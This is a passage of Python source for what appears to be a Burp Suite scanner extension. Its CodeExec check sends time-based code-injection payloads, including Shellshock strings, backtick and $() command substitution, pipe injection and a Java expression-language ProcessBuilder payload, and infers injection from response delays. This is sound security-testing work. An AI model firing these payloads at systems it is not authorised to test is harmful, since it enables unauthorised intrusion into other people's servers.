# _extensionMappings defines which payloads get called on which file extensions
class CodeExec(IScannerCheck):
    def __init__(self):
        # self._helpers = callbacks.getHelpers()

        self._done = getIssues('Code injection')

        self._payloads = {
            # Exploits shell command injection into '$input' on linux and "$input" on windows:
            # and CVE-2014-6271, CVE-2014-6278
            'any': ['() { :;}; /bin/sleep $time',
                    '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`'],
            'php': [],
            'perl': ['/bin/sleep $time|'],
            'ruby': ['|sleep $time & ping -n $time localhost'],
            # Expression language injection
            'java': [
                '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
        }

        # Used to ensure only appropriate payloads are attempted
        self._extensionMappings = {
            'php5': 'php',
            'php4': 'php',
            'php3': 'php',
            'php': 'php',
            'pl': 'perl',
            'cgi': 'perl',
            'jsp': 'java',
            'do': 'java',
            'action': 'java',
            'rb': 'ruby',
            '': ['php', 'ruby', 'java'],
            'unrecognised': 'java',

            # Code we don't have exploits for
            'asp': 'any',
            'aspx': 'any',
        }

    def doActiveScan(self, basePair, insertionPoint):

        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
        payloads = set()
        languages = self._getLangs(basePair)
        for lang in languages:
            new_payloads = self._payloads[lang]
            payloads |= set(new_payloads)
        payloads.update(self._payloads['any'])

        # Time how long each response takes compared to the baseline
        # Assumes <4 seconds jitter
        baseTime = 0
        for payload in payloads:
            if (baseTime == 0):
                baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
            if self._attack(basePair, insertionPoint, payload, 11)[0] > max(baseTime + 6, 10):
                debug_msg("Suspicious delay detected. Confirming it's consistent...")
                (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)

                if dummyAttack.getResponse() is None:
                    debug_msg('Received empty response to baseline request - abandoning attack')
                    break

                if (dummyTime < baseTime + 4):
                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                    if timer > max(dummyTime + 6, 10):
                        debug_msg("Code execution confirmed")
                        url = helpers.analyzeRequest(attack).getUrl()
                        if (url in self._done):
                            debug_msg("Skipping report - vulnerability already reported")
                            break
                        self._done.append(url)
                        return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
                                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0 seconds, and a response time of <b>" + str(
                                                    dummyTime) + "</b> seconds was observed. <br/>It was then instructed to sleep for 10 seconds, which resulted in a response time of <b>" + str(
                                                    timer) + "</b> seconds.</p>", 'Firm', 'High')]

        return []

    def _getLangs(self, basePair):
        path = helpers.analyzeRequest(basePair).getUrl().getPath()
        if '.' in path:
            ext = path.split('.')[-1]
        else:
            ext = ''

        if (ext in self._extensionMappings):
            code = self._extensionMappings[ext]
        else:
            code = self._extensionMappings['unrecognised']
        if (isinstance(code, basestring)):
            code = [code]
        return code

    def _attack(self, basePair, insertionPoint, payload, sleeptime):
        payload = Template(payload).substitute(time=sleeptime)

        # Use a hack to time the request. This information should be accessible via the API eventually.
        timer = time.time()
        attack = request(basePair, insertionPoint, payload)
        timer = time.time() - timer
        debug_msg("Response time: " + str(round(timer, 2)) + "| Payload: " + payload)

        requestHighlights = insertionPoint.getPayloadOffsets(payload)
        if (not isinstance(requestHighlights, list)):
            requestHighlights = [requestHighlights]
        attack = callbacks.applyMarkers(attack, requestHighlights, None)

        return (timer, attack)

    def doPassiveScan(self, basePair):
        return []

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        print "Reported: " + name + " on " + str(url)
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService


class BasicAuthInsertionPointProvider(IScannerInsertionPointProvider):
    def __init__(self, callbacks):
        self.callbacks = callbacks
        self.doneHosts = set()

    def getInsertionPoints(self, baseRequestResponse):
        request = baseRequestResponse.getRequest()
        requestInfo = self.callbacks.getHelpers().analyzeRequest(baseRequestResponse.getHttpService(), request)
        for header in requestInfo.getHeaders():
            if header.startswith("Authorization: Basic "):
                host = requestInfo.getUrl().getHost() + ":" + str(requestInfo.getUrl().getPort())
                if host in self.doneHosts:
                    return []
                else:
                    self.doneHosts.add(host)
                    return [BasicAuthInsertionPoint(request, 0), BasicAuthInsertionPoint(request, 1)]


class BasicAuthInsertionPoint(IScannerInsertionPoint):
    def __init__(self, baseRequest, position):
        self.baseRequest = ''.join(map(chr, baseRequest))
        self.position = position
        match = re.search("^Authorization: Basic (.*)$", self.baseRequest, re.MULTILINE)
        self.baseBlob = match.group(1)
        self.baseValues = base64.b64decode(self.baseBlob).split(':')
        self.baseOffset = self.baseRequest.index(self.baseBlob)

    def getInsertionPointName(self):
        return "BasicAuth" + ("UserName" if self.position == 0 else "Password")

    def getBaseValue(self):
        return self.baseValues[self.position]

    def makeBlob(self, payload):
        values = list(self.baseValues)
        values[self.position] = ''.join(map(chr, payload))
        return base64.b64encode(':'.join(values))

    def buildRequest(self, payload):
        return self.baseRequest.replace(self.baseBlob, self.makeBlob(payload))

    def getPayloadOffsets(self, payload):
        return jarray.array([self.baseOffset, self.baseOffset + len(self.makeBlob(payload))], 'i')

    def getInsertionPointType(self):
        return IScannerInsertionPoint.INS_EXTENSION_PROVIDED


# misc utility methods

def launchPassiveScan(attack):
    if attack.getResponse() is None:
        return
    service = attack.getHttpService()
    using_https = service.getProtocol() == 'https'
    callbacks.doPassiveScan(service.getHost(), service.getPort(), using_https, attack.getRequest(),
                            attack.getResponse())
    return


def location(url):
    return url.getProtocol() + "://" + url.getAuthority() + url.getPath()


def htmllist(list):
    list = ["<li>" + item + "</li>" for item in list]
    return "<ul>" + "\n".join(list) + "</ul>"


def tagmap(resp):
    tags = ''.join(re.findall("(?im)(<[a-z]+)", resp))
    return tags


def randstr(length=12, allow_digits=True):
    candidates = string.ascii_lowercase
    if allow_digits:
        candidates += string.digits
    return ''.join(random.choice(candidates) for x in range(length))


def hit(resp, baseprint):
    return (baseprint == tagmap(resp))

def anchor_change(probe, expect):
    left = randstr(4)
    right = randstr(4, allow_digits=False)
    probe = left + probe + right
    expected = []
    for x in expect:
        expected.append(left + x + right)
    return probe, expected

# currently unused as .getUrl() ignores the query string
def issuesMatch(existingIssue, newIssue):
    if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
        return -1
    else:
        return 0


def getIssues(name):
    prev_reported = filter(lambda i: i.getIssueName() == name, callbacks.getScanIssues(''))
    return (map(lambda i: i.getUrl(), prev_reported))


def request(basePair, insertionPoint, attack):
    req = insertionPoint.buildRequest(attack)
    return callbacks.makeHttpRequest(basePair.getHttpService(), req)

def is_same_issue(existingIssue, newIssue):
    if existingIssue.getIssueName() == newIssue.getIssueName():
        return -1
    else:
        return 0


def debug_msg(message):
    if DEBUG:
        print message


def setHeader(request, name, value, add_if_not_present=False):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
    elif add_if_not_present:
        # probably doesn't work with POST requests
        real_start = helpers.analyzeRequest(request).getBodyOffset()
        modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
    else:
        modified_request = request

    return modified, modified_request
